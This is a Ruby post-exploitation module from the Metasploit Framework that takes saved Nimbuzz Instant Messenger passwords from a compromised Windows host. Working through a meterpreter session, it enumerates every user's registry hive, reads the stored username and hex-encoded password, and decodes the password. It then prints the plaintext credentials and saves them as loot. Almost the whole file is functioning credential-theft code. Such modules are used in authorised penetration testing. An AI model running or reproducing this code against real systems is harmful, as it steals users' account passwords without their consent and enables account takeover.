##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/post/windows/registry'

class Metasploit3 < Msf::Post
	include Msf::Post::Windows::Registry
	include Msf::Auxiliary::Report

	def initialize(info={})
		super(update_info( info,
			'Name'          => 'Windows Gather Nimbuzz Instant Messenger Password Extractor',
			'Description'   => %q{
					This module extracts the account passwords saved by Nimbuzz Instant
				Messenger in hex format.
			},
			'License'       => MSF_LICENSE,
			'Author'        =>
				[
					'sil3ntdre4m <sil3ntdre4m[at]gmail.com>',
					'SecurityXploded Team', #www.SecurityXploded.com
				],
			'Version'       => '$Revision$',
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))
	end

	def run
		creds = Rex::Ui::Text::Table.new(
			'Header'  => 'Nimbuzz Instant Messenger Credentials',
			'Ident'   => 1,
			'Columns' =>
			[
				'Username',
				'Password'
			]
		)

		registry_enumkeys('HKU').each do |k|
			next unless k.include? "S-1-5-21"
			next if k.include? "_Classes"

			print_status("Looking at Key #{k}") if datastore['VERBOSE']
			subkeys = registry_enumkeys("HKU\\#{k}\\Software\\Nimbuzz\\")

			if subkeys == nil or subkeys == ""
				print_status ("Nimbuzz Instant Messenger not installed for this user.")
				return
			end

			user = registry_getvaldata("HKU\\#{k}\\Software\\Nimbuzz\\PCClient\\Application\\", "Username") || ""
			hpass = registry_getvaldata("HKU\\#{k}\\Software\\Nimbuzz\\PCClient\\Application\\", "Password")

			next if hpass == nil or hpass == ""

			hpass =~ /.{11}(.*)./
			decpass = [$1].pack("H*")
			print_good("User=#{user}, Password=#{decpass}")
			creds << [user, decpass]
		end

		print_status("Storing data...")
		path = store_loot(
			'nimbuzz.user.creds',
			'text/plain',
			session,
			creds,
			'nimbuzz_user_creds.txt',
			'Nimbuzz User Credentials'
		)

		print_status("Nimbuzz user credentials saved in: #{path}")
	end

end
